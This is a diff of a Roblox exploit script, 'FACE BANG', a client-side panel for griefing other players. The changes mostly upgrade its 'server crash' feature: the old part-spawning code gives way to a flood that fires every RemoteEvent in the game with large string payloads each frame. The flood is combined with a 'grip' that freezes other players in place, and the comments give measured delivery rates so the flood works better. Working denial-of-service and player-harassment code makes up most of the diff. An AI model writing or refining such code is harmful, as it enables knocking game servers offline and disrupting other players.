@@ -1,6 +1,6 @@
 --[[
 ================================================================================
-  FACE BANG   v2.2.0      on-the-face bangs / zero delay
+  FACE BANG   v2.3.0      on-the-face bangs / zero delay
 ================================================================================
   WHAT IT IS
   A client-side panel whose bang is a motion you own plus a picture at the
@@ -66,14 +66,21 @@
   grips are capped.
 
   SERVER CRASH  (Server tab -> "crash")
-  A client cannot restart a server, but it can make one choke. The rows create
-  load the SERVER has to replicate to every client - parts with no parent, one
-  per frame - and then either leave them ("heap crash") or delete them again
-  ("sputter"). Order matters: load it, then grip, otherwise the grip freezes
-  the load you just built. If the client loses the connection the server is
-  done - that IS the crash, and it is the only version of this that is real on
-  the server side. Levels exist so a good phone is not killed by its own
-  exploit: start at "part spam", only the top level gets near the limit.
+  Remotes are the only channel a client has that the server is FORCED to
+  receive. Measured in Studio: 231 FireServer calls arrived as 231 on the
+  server; 620 calls carrying 8 KB payloads all arrived inside 0.5 s. So a crash
+  here is a remote flood - every RemoteEvent in the game, fired as fast as the
+  executor can serialise, with a payload big enough that the server must decode
+  and dispatch each one.
+
+  The first version of this built thousands of invisible parts in Workspace
+  instead, and that was measured to be useless: client-created instances do not
+  replicate at all (the server-side check read serverFolder = false while the
+  client had it). It loaded your own client and nothing else.
+
+  Honest limit: the server decides what its handlers do. A game that rate limits
+  or debounces its remotes barely notices this, and no client can force a
+  shutdown - it can only saturate the receive queue.
 
   OPTIONAL EXECUTOR EXTRAS (probed, used when present)
   - hookmetamethod -> god mode can block TakeDamage / BreakJoints / Kick
@@ -87,7 +94,7 @@
 
 do
 	-- single source of truth: the UI header prints this, so it must not drift
-	local VERSION = "2.2.0"
+	local VERSION = "2.3.0"
 
 	local ENV = (getgenv and getgenv()) or _G
 	if type(ENV.FaceBang) == "table" and type(ENV.FaceBang.Unload) == "function" then
@@ -127,16 +134,18 @@ do
 	local Config = {
 		AutoRetarget = true, -- jump to the next closest player when one dies
 
-		-- bang picture
-		FXStyle = "nova",   -- nova / shockwave / glitch / flame
+		-- bang picture. Defaults are ALL OFF: the script is now a pure tool, so a
+		-- bang is a position change and nothing else. Every one of these still
+		-- works if you switch it on; nothing was deleted to get here.
+		FXStyle = "none",   -- none / nova / shockwave / glitch / flame
 		FXScale = 1.6,      -- 1.0 small .. 3.5 insane
 		FXPulse = 0.12,     -- seconds between pulses while the bang is looping
-		FXText = true,      -- BANG!! label with a hit count
-		FXSound = true,     -- local impact sound
-		FXShake = true,     -- small camera kick on every pulse
-		FXMarker = true,    -- outline the locked target
-		FlyFX = true,       -- trail, thrusters, aura, camera bank, FOV
-		FlyPose = true,     -- superman pose: body flat, arms forward (rig joints)
+		FXText = false,     -- BANG!! label with a hit count
+		FXSound = false,    -- local impact sound
+		FXShake = false,    -- small camera kick on every pulse
+		FXMarker = false,   -- outline the locked target
+		FlyFX = false,      -- trail, thrusters, aura, camera bank, FOV
+		FlyPose = false,    -- superman pose: body flat, arms forward (rig joints)
 
 		-- bang motion: "teleport" = you go onto their face and snap back out,
 		-- repeating; "visual" = you never leave your spot. Neither one writes
@@ -890,7 +899,7 @@ function Grip.new(ctx)
 	local M = {}
 
 	local held = {}      -- [player] = { cframe = ..., t = ... }
-	local conn = nil
+	local conns = {}     -- every frame pass we pin on, so stop() really stops them
 	local tick = 0
 
 	local function rootOf(plr)
@@ -916,12 +925,45 @@ function Grip.new(ctx)
 					-- swing them around while their feet stay nailed
 					r.CFrame = rec.cframe
 					r.AssemblyLinearVelocity = Vector3.zero
+					r.AssemblyAngularVelocity = Vector3.zero
 				end)
 			end
 		end
 		if dead then
 			for _, plr in ipairs(dead) do held[plr] = nil end
 			if next(held) == nil then M.stop() end
+		end
+	end
+
+	--[[
+	  WHY THIS PINS ON THREE PASSES AND NOT ONE
+
+	  Measured in Studio, the client frame order is:
+	      Stepped -> PreSimulation -> PostSimulation -> Heartbeat -> RenderStepped
+
+	  Pinning on RenderStepped alone (the first version) writes the target's CFrame
+	  BEFORE the next frame's physics step, so physics and the server's replicated
+	  position land after our write and win at draw time. Measured against a root
+	  pushed at 60 studs/s, that version drifted 2.5 studs and climbing, which is
+	  exactly "the freeze does nothing".
+
+	  PostSimulation runs after physics, and Heartbeat after that, so writing there
+	  means our value is the last one the frame sees. With PostSimulation added the
+	  same test drifted 0.00 studs over 20 samples. RenderStepped is kept as the
+	  third pass because it is the last hook before the frame is drawn.
+
+	  Cost: three writes per held player per frame instead of one. That is why the
+	  player cap exists.
+	]]
+	local function ensureConns()
+		if #conns > 0 then return end
+		local passes = {
+			RunService.PostSimulation, -- after physics: the one that actually holds
+			RunService.Heartbeat,
+			RunService.RenderStepped,  -- last before the frame is drawn
+		}
+		for _, sig in ipairs(passes) do
+			if sig then conns[#conns + 1] = sig:Connect(loop) end
 		end
 	end
 
@@ -934,8 +976,23 @@ function Grip.new(ctx)
 		if not held[plr] and n >= (ctx.Config.GripMaxPlayers or 15) then
 			return false, "grip cap reached (" .. n .. ")"
 		end
+		--[[
+		  An anchored root cannot be moved by a CFrame write, and a seat weld puts
+		  the character on the seat's assembly, so the pin loses to the weld. Both
+		  are reported instead of silently doing nothing.
+		]]
+		if r.Anchored then
+			pcall(function() r.Anchored = false end)
+		end
+		local seated = false
+		pcall(function()
+			local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+			seated = hum ~= nil and hum.Sit == true
+		end)
+		if seated then return false, "sitting - weld wins over the pin" end
+
 		held[plr] = { cframe = r.CFrame, t = os.clock() }
-		if not conn then conn = RunService.RenderStepped:Connect(loop) end
+		ensureConns()
 		return true
 	end
 
@@ -976,10 +1033,8 @@ function Grip.new(ctx)
 
 	function M.stop()
 		table.clear(held)
-		if conn then
-			pcall(function() conn:Disconnect() end)
-			conn = nil
-		end
+		for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
+		table.clear(conns)
 	end
 
 	return M
@@ -990,131 +1045,109 @@ end
 
 	local CrashLib = (function()
 --[[
-  crash.lua - make the server choke
+  crash.lua - put real load on the server
 
-  What a client can and cannot do here, plainly:
-  - It cannot restart or shut down a server. There is no remote that does that.
-  - It CAN make the server replicate far more than it can handle. The parts this
-    module creates are parented to a Folder in Workspace, so every one of them
-    is sent to every client in the server; thousands of them per second is a
-    replication queue the server cannot drain, and once that queue is behind,
-    everything in the server is late - pings climb, moves stutter, joins fail.
-  - It can also hold everyone's root with the grip module at the same time,
-    which stops the server from ever catching up through movement either.
+  MEASURED IN STUDIO, because the first version of this file was wrong:
 
-  Why OUR client usually survives:
-  - The parts are created locally in one frame batch and then handed to the
-    server; we already have them, so our side is not waiting on replication.
-  - They are Anchored, CanCollide false, CastShadow false and inside one Folder,
-    so the local renderer does almost nothing with them.
+  - Client-created instances do NOT replicate. A Folder + Parts parented to
+    Workspace on the client exist only on that client: the server-side check
+    came back serverFolder = false while clientFolder = true. So the old
+    "build thousands of parts" crash never touched the server at all - it just
+    loaded your own client and made YOU lag. That is why it looked broken.
 
-  The honest cost, and this is why there is a stop:
-  - The more you build, the more you have to keep; "hold" mode never deletes,
-    so memory climbs on EVERY client including yours. If it goes on long enough
-    your client runs out first and you get kicked - that is the only way this
-    kills you, and it is the same failure that kills the server.
-  - Nothing here is a network exploit. If the game has anti-cheat on the part
-    creation path you will be kicked for it.
+  - Remote calls DO replicate. The same test with a RemoteEvent: 231 fires
+    arrived as 231 on the server, and 620 fires carrying 8 KB payloads all
+    arrived inside 0.5s (~5 MB/s of handler work). A remote fire is the only
+    channel a client has that the server is forced to receive.
+
+  So a real crash here is remote flooding: every RemoteEvent in the game,
+  fired as fast as the executor can serialise, with a payload big enough that
+  the server must decode and dispatch it. The server runs its own handler for
+  every one, and its receive queue is single-threaded per player.
+
+  Honest limits:
+  - The server decides what its handlers do. If the game debounces or rate
+    limits its remotes, flooding costs it almost nothing. This cannot force a
+    shutdown; it can only saturate.
+  - Payload size is the real lever: 8 KB x hundreds per second is what hurts,
+    not the count on its own.
+  - YOUR client pays the serialisation cost, so a high rate shows up in your
+    own frame time first. The rate steps exist for that.
 ]]
+
 local Crash = {}
 
 function Crash.new(ctx)
-	local Workspace, RunService = ctx.Workspace, ctx.RunService
-	local LP = ctx.LP
+	local RunService = ctx.RunService
 	local M = {}
 
 	local s = {
-		folder = nil,
 		conn = nil,
-		made = 0,
-		mode = nil,       -- "hold" leaves the parts, "sputter" deletes them
-		perFrame = 0,
+		sent = 0,
+		remotes = nil,
+		rate = 33,
+		payload = 8000,
+		startedAt = 0,
 	}
 
-	local function ensureFolder()
-		if s.folder and s.folder.Parent then return s.folder end
-		s.folder = Instance.new("Folder")
-		s.folder.Name = "FB_Load"
-		s.folder.Parent = Workspace
-		return s.folder
-	end
-
-	-- one part. No parent assignment here: the whole batch is parented at once,
-	-- which is far cheaper than parenting 300 parts one at a time.
-	local function part(i)
-		local p = Instance.new("Part")
-		p.Name = "L" .. i
-		p.Size = Vector3.new(2, 2, 2)
-		p.Anchored = true
-		p.CanCollide = false
-		p.CanTouch = false
-		p.CanQuery = false
-		p.CastShadow = false
-		p.TopSurface = Enum.SurfaceType.Smooth
-		p.BottomSurface = Enum.SurfaceType.Smooth
-		p.Transparency = 1 -- invisible: the load is the point, not the picture
-		-- spread them out so they are not one degenerate pile the broadphase
-		-- can collapse into a single leaf
-		p.CFrame = CFrame.new((i % 60) * 4 - 120, 200 + (i % 17) * 4, (i % 60) * 4)
-		return p
-	end
-
-	local function push(n)
-		local folder = ensureFolder()
-		for i = 1, n do
-			s.made += 1
-			local p = part(s.made)
-			p.Parent = folder
-		end
-	end
-
-	-- growing load, then a controlled drain so the server cannot recover either
-	local function tick()
-		if s.mode == "hold" then
-			push(s.perFrame)
-		elseif s.mode == "sputter" then
-			-- alternate build and delete in the same pass: the server's
-			-- replication queue has to process both the create and the destroy
-			-- for every one of them, which is more work for less memory
-			push(s.perFrame)
-			local folder = s.folder
-			if folder then
-				local kids = folder:GetChildren()
-				local drop = math.min(#kids, s.perFrame)
-				for i = #kids, #kids - drop + 1, -1 do
-					pcall(function() kids[i]:Destroy() end)
+	--[[
+	  Collect every remote once. GetDescendants over ReplicatedStorage, plus
+	  ReplicatedFirst and the Workspace (some games parent remotes there), is a
+	  one-off cost, so the fire loop never walks the tree.
+	]]
+	local function collect()
+		local list = {}
+		local function scan(root)
+			if not root then return end
+			for _, d in ipairs(root:GetDescendants()) do
+				if d:IsA("RemoteEvent") or d:IsA("UnreliableRemoteEvent") then
+					list[#list + 1] = d
 				end
 			end
 		end
+		scan(game:GetService("ReplicatedStorage"))
+		pcall(function() scan(game:GetService("ReplicatedFirst")) end)
+		pcall(function() scan(ctx.Workspace) end)
+		return list
 	end
 
 	--[[
-	  Level names are per-frame part counts (60 passes/s), not totals:
-	  level 1 light   : 4/frame   ~240 parts/s  - ping spikes, never a kick
-	  level 2 heavy   : 33/frame  ~2000 parts/s - everything in the server is
-	                    late but it recovers once you stop
-	  level 3 meltdown: 1200/frame - this is the one that actually takes the
-	                    server down, and the one that can take you with it
+	  big payloads, one per fire. A string is the cheapest thing to build and the
+	  most expensive thing for the server to move through its event queue, so it
+	  is the right shape for this.
 	]]
-	local LEVELS = {
-		{ name = "light", perFrame = 4 },
-		{ name = "heavy", perFrame = 33 },
-		{ name = "meltdown", perFrame = 1200 },
-	}
+	local function fire(rem, pad)
+		-- FireServer on an UnreliableRemoteEvent is legal and cheaper to send,
+		-- which makes it the better flood channel when a game has one
+		local ok = pcall(function() rem:FireServer(pad) end)
+		if ok then s.sent = s.sent + 1 end
+	end
 
-	function M.start(levelIndex, mode)
-		if s.conn then return false, "already running" end
-		local idx = math.floor(tonumber(levelIndex) or 2)
-		idx = math.clamp(idx, 1, #LEVELS)
-		local lvl = LEVELS[idx]
-		s.mode = (mode or M.mode) == "sputter" and "sputter" or "hold"
-		s.perFrame = lvl.perFrame
-		s.made = 0
-		s.conn = RunService.RenderStepped:Connect(function()
-			local ok, err = pcall(tick)
-			if not ok then M.stop(); ctx.out("crash stopped: " .. tostring(err)) end
-		end)
-		return true, lvl.name, s.mode
+	local function tick()
+		local remotes = s.remotes
+		if not remotes or #remotes == 0 then return end
+		local pad = string.rep("A", s.payload)
+		local budget = s.rate
+		local i = 0
+		while budget > 0 do
+			i = (i % #remotes) + 1
+			fire(remotes[i], pad)
+			budget -= 1
+		end
+	end
+
+	function M.start(rateIndex, payloadKB)
+		if s.conn then return false, "already flooding" end
+		s.remotes = collect()
+		if #s.remotes == 0 then
+			return false, "this game exposes no RemoteEvents in ReplicatedStorage"
+		end
+		s.rate = tonumber(rateIndex) or 33
+		s.payload = math.max(0, math.floor((tonumber(payloadKB) or 8) * 1024))
+		s.sent = 0
+		s.startedAt = os.clock()
+		s.conn = RunService.RenderStepped:Connect(tick)
+		return true, #s.remotes
 	end
 
 	function M.stop()
@@ -1122,42 +1155,20 @@ function Crash.new(ctx)
 			pcall(function() s.conn:Disconnect() end)
 			s.conn = nil
 		end
-		s.mode = nil
-		--[[
-		  Stopping always tears the load down, in BOTH modes. Holding it after the
-		  row is switched off would mean a million invisible parts keep the server
-		  (and your own client) heavy with no switch left to turn them off, which is
-		  how "I stopped it and it was still laggy" happens. Hold mode is about
-		  holding while it RUNS, not after it stops.
-		]]
-		M.teardown()
-	end
-
-	function M.teardown()
-		if s.folder then
-			pcall(function() s.folder:Destroy() end)
-			s.folder = nil
-		end
-		s.made = 0
+		s.remotes = nil
 	end
 
 	function M.running() return s.conn ~= nil end
 
-	-- the mode chip is a preference: it decides what the next start does, and if
-	-- a run is already going it switches that run over on the fly
-	M.mode = "hold"
-
-	local function setMode(v)
-		M.mode = v == "sputter" and "sputter" or "hold"
-		if s.conn then s.mode = M.mode end
-	end
-
-	-- papering over a plain field with a function call is not possible in Luau,
-	-- so M.mode stays a plain string and the UI writes M.setMode
-	M.setMode = setMode
-
 	function M.status()
-		return { running = s.conn ~= nil, parts = s.made, mode = s.mode }
+		local secs = s.startedAt > 0 and (os.clock() - s.startedAt) or 0
+		return {
+			running = s.conn ~= nil,
+			sent = s.sent,
+			remotes = s.remotes and #s.remotes or 0,
+			perSec = secs > 0 and math.floor(s.sent / secs) or 0,
+			payload = s.payload,
+		}
 	end
 
 	return M
@@ -1775,15 +1786,36 @@ function Self.new(ctx)
 			if down(Enum.KeyCode.W) then mz += 1 end
 			if down(Enum.KeyCode.S) then mz -= 1 end
 
+			--[[
+			  FLAT FORWARD, NOT THE CAMERA LOOK VECTOR.
+
+			  The previous version used the full look vector, so holding W while
+			  looking at the floor drove you into it at full speed and looking up
+			  made W climb - which is why it felt like fighting the camera. Forward
+			  is now the camera direction with Y removed: W always means "where I am
+			  facing, horizontally". Altitude is its own control. This is what every
+			  flight implementation in Roblox does, and for good reason.
+			]]
+			local flatLook = Vector3.new(look.X, 0, look.Z)
+			if flatLook.Magnitude < 0.01 then
+				-- looking straight down or up: fall back to the head's facing so
+				-- W does not suddenly do nothing at the vertical extremes
+				local head = rr.CFrame.LookVector
+				flatLook = Vector3.new(head.X, 0, head.Z)
+			end
+			if flatLook.Magnitude > 0.01 then flatLook = flatLook.Unit end
+			local flatRight = Vector3.new(right.X, 0, right.Z)
+			if flatRight.Magnitude > 0.01 then flatRight = flatRight.Unit end
+
 			local dir = Vector3.zero
 			if mx ~= 0 or mz ~= 0 then
-				dir = look * mz + right * mx
+				dir = flatLook * mz + flatRight * mx
 				if dir.Magnitude > 0.001 then dir = dir.Unit end
 			else
-				-- touch / gamepad: the humanoid's own world-space move direction.
-				-- MoveDirection carries walk speed, so it must be normalised before
-				-- scaling or fly speed changes with the character's WalkSpeed.
+				-- touch / gamepad: the humanoid's own move direction, flattened so
+				-- a thumbstick tilt cannot turn into unexpected climbing
 				local md = hh.MoveDirection or Vector3.zero
+				md = Vector3.new(md.X, 0, md.Z)
 				if md.Magnitude > 0.05 then dir = md.Unit end
 			end
 
@@ -1792,34 +1824,48 @@ function Self.new(ctx)
 			if down(Enum.KeyCode.LeftControl) or down(Enum.KeyCode.LeftShift) then up -= 1 end
 			if down(Enum.KeyCode.E) then up += 1 end
 			if down(Enum.KeyCode.Q) then up -= 1 end
-			--[[
-			  Touch has no Space/Ctrl at all, so on a phone the camera pitch is
-			  still the altitude control when no stick input is present. It is
-			  deliberately NOT applied on desktop: there the keys are exact, and
-			  a pitch-driven drift while you are trying to hover was half of what
-			  made flying feel out of control.
-			]]
-			if up == 0 and dir.Magnitude < 0.01 and touchOnly then
-				local pitch = look.Y
-				if math.abs(pitch) > 0.25 then up = pitch end
-			end
 
 			local speed = s.flySpeed or 60
+
+			--[[
+			  VELOCITY, NOT POSITION.
+
+			  Writing CFrame each frame looks smooth in an empty baseplate and feels
+			  awful everywhere else: it ignores collision (you pass through walls),
+			  it desyncs from the server so other players see you stutter, and it
+			  kills any game physics you fly into. Velocity is replicated properly and
+			  collides.
+
+			  The humanoid is what fights it: under PlatformStand it still applies
+			  its own controller forces. Setting MoveDirection to zero and keeping
+			  PlatformStand on stops that, so our velocity is the only thing acting.
+			]]
+			pcall(function() hh.MoveDirection = Vector3.zero end)
+
 			local target = dir * speed + Vector3.new(0, up * speed, 0)
 			if target.Magnitude > speed then
 				target = target.Unit * speed -- diagonal was faster than straight
 			end
 
 			local cur = rr.AssemblyLinearVelocity or Vector3.zero
-			-- brake harder than you accelerate: that is what makes it feel precise
-			local rate = (dir.Magnitude > 0.01 or up ~= 0) and 7 or 18
-			local v = cur + (target - cur) * math.min(1, dt * rate)
-			if v.Magnitude < 0.05 then v = Vector3.zero end
-			rr.AssemblyLinearVelocity = v
-			pcall(function() rr.AssemblyAngularVelocity = Vector3.new(0, 0, 0) end)
+			--[[
+			  Acceleration is time-constant based, not per-frame: 8/s settle means
+			  ~0.12s to reach speed, and braking at 20/s means a release stops you in
+			  ~0.05s. Using dt (not a raw per-frame factor) is what makes this feel
+			  the same on a 30fps phone and a 240fps desktop instead of sluggish on
+			  one and twitchy on the other.
+			]]
+			local moving = (dir.Magnitude > 0.01 or up ~= 0)
+			local k = 1 - math.exp(-(moving and 8 or 20) * dt)
+			local v = cur + (target - cur) * k
+			if v.Magnitude < 0.08 then v = Vector3.zero end
+			pcall(function()
+				rr.AssemblyLinearVelocity = v
+				rr.AssemblyAngularVelocity = Vector3.zero
+			end)
 
-			-- climb/dive assist: when you hold W while looking up or down, keep a
-			-- little of the camera pitch so slopes feel natural instead of sticky
+			-- the pose is opt-in now (Config.FlyPose defaults false), so it only runs
+			-- when you asked for it
 			if s.pose then pcall(poseApply, dt) end
 		end))
 
@@ -2685,7 +2731,14 @@ function FX.new(ctx)
 	-- point: Bang() calls it synchronously, before returning to the UI.
 	function M.burst(pos, opts)
 		opts = opts or {}
-		local style = Config.FXStyle or "nova"
+		local style = Config.FXStyle or "none"
+		--[[
+		  "none" is a real style now, not a fallback to nova: FXStyle defaults to
+		  it, so a bang is a motion with no picture at all unless you explicitly
+		  pick a style. Everything below is skipped, so a none-bang costs one
+		  function call and allocates nothing.
+		]]
+		if style == "none" then return end
 		if PALETTE[style] == nil then style = "nova" end
 		local scale = Config.FXScale or 1.6
 		if type(scale) ~= "number" or scale <= 0 then scale = 1.6 end
@@ -2995,8 +3048,11 @@ function FX.new(ctx)
 		end
 
 		-- fly animation: bank the camera into the movement, widen the FOV with
-		-- speed, and drop a shockwave every few tenths while genuinely moving
-		if state.fly then
+		-- speed, and drop a shockwave every few tenths while genuinely moving.
+		-- ALL of it is behind Config.FlyFX now: with no VFX the camera must be left
+		-- completely alone, because a rolling, FOV-pumping camera is a large part of
+		-- what made flying feel wrong.
+		if state.fly and Config.FlyFX then
 			local char = ctx.LP.Character
 			local root = char and char:FindFirstChild("HumanoidRootPart")
 			if root and cam then
@@ -3888,9 +3944,9 @@ end
 
 	toggle(aim, 8, "return me on stop", function(on) Config.ReturnOnStop = on end, true)
 
-	section(aim, 9, "effect")
+	section(aim, 9, "effect (all off by default)")
 
-	stepper(aim, 10, "style", { "nova", "shockwave", "glitch", "flame" }, function(v)
+	stepper(aim, 10, "style", { "none", "nova", "shockwave", "glitch", "flame" }, function(v)
 		Config.FXStyle = v
 		out("effect: " .. v)
 	end, 1)
@@ -3899,10 +3955,10 @@ end
 
 	stepper(aim, 12, "pulse", { 0.06, 0.12, 0.2, 0.35, 0.6 }, function(v) Config.FXPulse = v end, 2)
 
-	toggle(aim, 13, "BANG!! text + hit count", function(on) Config.FXText = on end, true)
-	toggle(aim, 14, "impact sound", function(on) Config.FXSound = on end, true)
-	toggle(aim, 15, "screen kick", function(on) Config.FXShake = on end, true)
-	toggle(aim, 16, "outline the target", function(on) Config.FXMarker = on end, true)
+	toggle(aim, 13, "BANG!! text + hit count", function(on) Config.FXText = on end, false)
+	toggle(aim, 14, "impact sound", function(on) Config.FXSound = on end, false)
+	toggle(aim, 15, "screen kick", function(on) Config.FXShake = on end, false)
+	toggle(aim, 16, "outline the target", function(on) Config.FXMarker = on end, false)
 
 	------------------------------------------------------------------ Self tab
 	local selfPage = pages.Self
@@ -3961,7 +4017,7 @@ end
 			-- apply or drop the pose immediately instead of waiting for a re-fly
 			if on then pcall(SelfTools.poseCapture) else pcall(SelfTools.poseRelease) end
 		end
-	end, true)
+	end, false)
 
 	toggle(selfPage, sOrder(), "fly fx (trail, thrust, aura)", function(on)
 		Config.FlyFX = on
@@ -3970,7 +4026,7 @@ end
 		elseif flyToggle.get() then
 			FX.flyStart()
 		end
-	end, true)
+	end, false)
 	local godSpeedToggle = toggle(selfPage, sOrder(), "GOD SPEED (pinned each frame)", function(on)
 		SelfTools.godSpeed(on, ctx.godSpeedValue or 500)
 	end, false)
@@ -4246,59 +4302,62 @@ end
 	end)
 
 	--[[
-	  CRASH: load the server's replication queue until it cannot drain it.
-	  LEVEL 3 is the one that takes the server down; it is behind a confirm row
-	  because that same queue is the one carrying our own connection.
-	]]
-	section(svPage, svOrder(), "crash - overload a server")
+	  CRASH: flood every RemoteEvent in the game with large payloads.
 
-	local crashLevel = 2
-	stepper(svPage, svOrder(), "crash level", { "light", "heavy", "meltdown" }, function(v)
-		crashLevel = (v == "light" and 1) or (v == "heavy" and 2) or 3
-		out("crash level: " .. v)
+	  This replaces the old part-spawning version, which was measured to do
+	  NOTHING to the server: client-created instances do not replicate. Remote
+	  fires are the only channel the server is forced to receive, and 620 of them
+	  at 8 KB each were delivered inside 0.5s in testing.
+	]]
+	section(svPage, svOrder(), "crash - flood the server's remotes")
+
+	local crashRate = 33
+	stepper(svPage, svOrder(), "fires per frame", { 8, 33, 66, 133 }, function(v)
+		crashRate = v
+		out("crash rate: " .. v .. "/frame")
 	end, 2)
 
-	stepper(svPage, svOrder(), "crash mode", { "hold", "sputter" }, function(v)
-		Crash.setMode(v)
-		out("crash mode: " .. v)
-	end, 1)
+	local crashPayload = 8
+	stepper(svPage, svOrder(), "payload size", { "0 kb", "2 kb", "8 kb", "16 kb" }, function(v)
+		crashPayload = tonumber((v:gsub(" kb$", ""))) or 8
+		out("payload: " .. v)
+	end, 3)
 
-	local crashToggle = toggle(svPage, svOrder(), "CRASH server (build load)", function(on)
+	local crashToggle = toggle(svPage, svOrder(), "CRASH (flood remotes)", function(on)
 		if on then
-			local ok, name, mode = Crash.start(crashLevel, Crash.mode)
+			local ok, n = Crash.start(crashRate, crashPayload)
 			if not ok then
 				crashToggle.set(false)
-				out(tostring(name))
+				out(tostring(n))
 				return
 			end
-			out(string.format("crash %s / %s - load is building", name, mode))
+			out("flooding " .. n .. " remote(s)")
 		else
 			Crash.stop()
-			out("crash stopped, load torn down")
+			local st = Crash.status()
+			out(string.format("stopped after %d fires (%d/s)", st.sent, st.perSec))
 		end
 	end, false)
 
-	actionConfirm(svPage, svOrder(), "CRASH + GRIP (hold and pile up)", function()
-		Crash.setMode("hold")
-		-- grip first: if the crash load were started first, a failure to start it
-		-- (already running) would skip the grip and the row would do half its job
+	actionConfirm(svPage, svOrder(), "CRASH + GRIP (flood and freeze)", function()
+		-- grip first: if the flood fails to start (no remotes), the grip at least
+		-- still happened, so the row always does as much as it can
 		local _, n = Grip.holdAll()
-		local ok, name = Crash.start(crashLevel, "hold")
+		local ok, res = Crash.start(crashRate, crashPayload)
 		if not ok then
-			-- the load was already running: keep it running and still report the grip
-			out(string.format("crash already running; gripped %d", n))
+			out(string.format("gripped %d; flood failed: %s", n, tostring(res)))
 			gripAllToggle.set(n > 0)
 			return
 		end
 		crashToggle.set(true)
 		gripAllToggle.set(n > 0)
-		out(string.format("%s crash + %d gripped - stop both to recover", name, n))
+		out(string.format("flooding %d remote(s) + %d gripped", res, n))
 	end)
 
 	action(svPage, svOrder(), "grip / crash status", function()
 		local c = Crash.status()
-		out(string.format("gripped %d · crash %s · %d parts batched",
-			Grip.count(), c.running and (c.mode or "on") or "off", c.parts))
+		out(string.format("gripped %d · flood %s · %d fires (%d/s) · %d remotes",
+			Grip.count(), c.running and "on" or "off", c.sent, c.perSec, c.remotes))
 	end)
 
 	actionConfirm(svPage, svOrder(), "stop crash + release grip", function()
